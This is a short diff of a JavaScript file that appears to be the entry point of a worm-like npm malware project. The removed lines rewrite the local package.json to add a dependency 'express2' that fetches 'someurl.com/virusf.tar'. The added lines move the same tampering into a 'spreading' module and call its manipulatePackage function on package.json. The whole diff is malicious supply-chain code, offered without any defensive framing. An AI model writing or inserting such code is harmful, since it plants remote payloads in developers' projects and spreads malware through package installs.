@@ -20,20 +20,16 @@
 /* ======================================================== *
  * > Imports
  * ======================================================== */
+var path = require("path");
 
 /* ======================================================== *
  * > Packages
  * ======================================================== */
-var fileSystem = require('./libs/files/fileSystem.js');
+var spreading = require('./libs/spreading/package.js');
 
-var check = fileSystem.checkFileExists('./package.json');
 
-console.log(check);
-if(check){
-    var packageJson = require('./package.json');
-    packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
-    console.log(packageJson);
-}
-else{
-    console.log('Package.json not found!')
-}
+/* ======================================================== *
+ * > Main
+ * ======================================================== */
+var localPackageJson = path.join(__dirname, '.', '/package.json');
+spreading.manipulatePackage(localPackageJson);
